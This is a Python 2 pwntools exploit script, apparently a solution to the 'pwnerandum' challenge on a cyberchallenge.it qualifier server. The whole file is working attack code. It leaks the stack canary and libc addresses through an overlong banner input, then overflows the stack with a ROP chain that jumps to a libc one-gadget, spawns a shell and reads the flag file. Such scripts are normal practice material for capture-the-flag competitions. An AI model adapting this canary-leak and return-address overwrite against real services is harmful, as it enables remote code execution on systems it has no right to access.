#!/usr/bin/env python2
from pwn import *

# p = process('./pwnerandum',env={'LD_PRELOAD':'./libc.so',})
p = remote('pwnerandum.quals.cyberchallenge.it', 3344)

def become_admin(secret):
    p.recvuntil('>> ')
    p.sendline('4')
    p.recvuntil('premium')
    p.sendline(secret)

def nubanner(len, banner):
    p.recvuntil('>> ')
    p.sendline('5')
    p.recvuntil('banner:')
    p.sendline(str(len))
    p.recvuntil('banner:')
    p.sendline(banner)

become_admin('\x01'*0x1b)

nubanner(str(521), cyclic(521))
p.recvuntil('aaff')
canary = u64('\0'+p.recv(7))
log.success('canary: 0x%x' % canary)

nubanner(str(528), cyclic(528))
p.recvuntil('gaaf')
leak1 = u64(p.recv(6)+'\0\0')
log.success('leak1: 0x%x' % leak1)

nubanner(str(536), cyclic(536))
p.recvuntil('iaaf')
leak2 = u64(p.recv(6)+'\0\0')
log.success('leak2: 0x%x' % leak2)

libc_base = leak2 - 0x21b97
log.success('libc base: 0x%x', libc_base)

magic = p64(libc_base + 0x4f2c5)

rop = cyclic(520)+p64(canary)
rop += p64(0xdeadbeefabadcafe)
rop += magic

nubanner(str(len(rop)), rop)
p.sendline('9')
p.clean()

p.sendline("cat flag.txt")
p.interactive()
